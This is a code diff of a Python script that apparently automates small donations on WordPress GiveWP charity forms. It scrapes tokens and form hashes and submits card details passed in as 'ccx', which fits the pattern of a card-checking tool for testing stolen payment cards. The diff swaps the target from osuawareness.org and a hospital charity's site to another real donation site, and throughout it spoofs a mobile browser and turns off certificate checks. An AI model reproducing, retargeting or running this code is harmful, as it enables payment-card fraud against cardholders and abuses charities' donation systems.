@@ -35,7 +35,7 @@ def pp(ccx, amount="5.00", retry_count=1):
         r.verify = False
         
         headers = {
-            'authority': 'osuawareness.org',
+            'authority': 'www.romelduanemooresr.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
@@ -51,7 +51,7 @@ def pp(ccx, amount="5.00", retry_count=1):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
         
-        response = r.get('https://osuawareness.org/donation', headers=headers, timeout=20)
+        response = r.get('https://www.romelduanemooresr.com/donations/2584/', headers=headers, timeout=20)
         
         if response.status_code != 200:
             return f"Site Error: {response.status_code}", "ERROR"
@@ -66,12 +66,12 @@ def pp(ccx, amount="5.00", retry_count=1):
         au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
         
         headers = {
-            'authority': 'tdcaustralia.com.au',
+            'authority': 'www.romelduanemooresr.com',
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://osuawareness.org',
-            'referer': 'https://osuawareness.org/donation',
+            'origin': 'https://www.romelduanemooresr.com',
+            'referer': 'https://www.romelduanemooresr.com/donations/2584/',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -87,8 +87,8 @@ def pp(ccx, amount="5.00", retry_count=1):
             'give-form-id-prefix': pro0,
             'give-form-id': ifr,
             'give-form-title': 'Donate for a Unit/Room at TDC Sahiwal Hospital',
-            'give-current-url': 'https://osuawareness.org/donation',
-            'give-form-url': 'https://osuawareness.org/donation',
+            'give-current-url': 'https://www.romelduanemooresr.com/donations/2584/',
+            'give-form-url': 'https://www.romelduanemooresr.com/donations/2584/',
             'give-form-minimum': amount,
             'give-form-maximum': '999999.99',
             'give-form-hash': ssa,
@@ -124,15 +124,15 @@ def pp(ccx, amount="5.00", retry_count=1):
             'give_ajax': 'true',
         }
         
-        response = r.post('https://osuawareness.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=20)
+        response = r.post('https://www.romelduanemooresr.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=20)
         
         multipart_data = MultipartEncoder({
             'give-honeypot': (None, ''),
             'give-form-id-prefix': (None, pro0),
             'give-form-id': (None, ifr),
             'give-form-title': (None, 'Donate for a Unit/Room at TDC Sahiwal Hospital'),
-            'give-current-url': (None, 'https://osuawareness.org/donation'),
-            'give-form-url': (None, 'https://osuawareness.org/donation'),
+            'give-current-url': (None, 'https://www.romelduanemooresr.com/donations/2584/'),
+            'give-form-url': (None, 'https://www.romelduanemooresr.com/donations/2584/'),
             'give-form-minimum': (None, amount),
             'give-form-maximum': (None, '999999.99'),
             'give-form-hash': (None, ssa),
@@ -170,8 +170,8 @@ def pp(ccx, amount="5.00", retry_count=1):
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'content-type': multipart_data.content_type,
-            'origin': 'https://osuawareness.org',
-            'referer': 'https://osuawareness.org/donation',
+            'origin': 'https://www.romelduanemooresr.com',
+            'referer': 'https://www.romelduanemooresr.com/donations/2584/',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -186,7 +186,7 @@ def pp(ccx, amount="5.00", retry_count=1):
         }
         
         response = r.post(
-            'https://osuawareness.org/wp-admin/admin-ajax.php',
+            'https://www.romelduanemooresr.com/wp-admin/admin-ajax.php',
             params=params,
             headers=headers,
             data=multipart_data,
@@ -244,8 +244,8 @@ def pp(ccx, amount="5.00", retry_count=1):
             'give-form-id-prefix': (None, pro0),
             'give-form-id': (None, ifr),
             'give-form-title': (None, 'Donate for a Unit/Room at TDC Sahiwal Hospital'),
-            'give-current-url': (None, 'https://osuawareness.org/donation'),
-            'give-form-url': (None, 'https://osuawareness.org/donation'),
+            'give-current-url': (None, 'https://www.romelduanemooresr.com/donations/2584/'),
+            'give-form-url': (None, 'https://www.romelduanemooresr.com/donations/2584/'),
             'give-form-minimum': (None, amount),
             'give-form-maximum': (None, '999999.99'),
             'give-form-hash': (None, ssa),
@@ -279,12 +279,12 @@ def pp(ccx, amount="5.00", retry_count=1):
         })
         
         headers = {
-            'authority': 'tdcaustralia.com.au',
+            'authority': 'www.romelduanemooresr.com',
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'content-type': multipart_data2.content_type,
-            'origin': 'https://osuawareness.org',
-            'referer': 'https://osuawareness.org/donation',
+            'origin': 'https://www.romelduanemooresr.com',
+            'referer': 'https://www.romelduanemooresr.com/donations/2584/',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -300,7 +300,7 @@ def pp(ccx, amount="5.00", retry_count=1):
         }
         
         response = r.post(
-            'https://osuawareness.org/wp-admin/admin-ajax.php',
+            'https://www.romelduanemooresr.com/wp-admin/admin-ajax.php',
             params=params,
             headers=headers,
             data=multipart_data2,
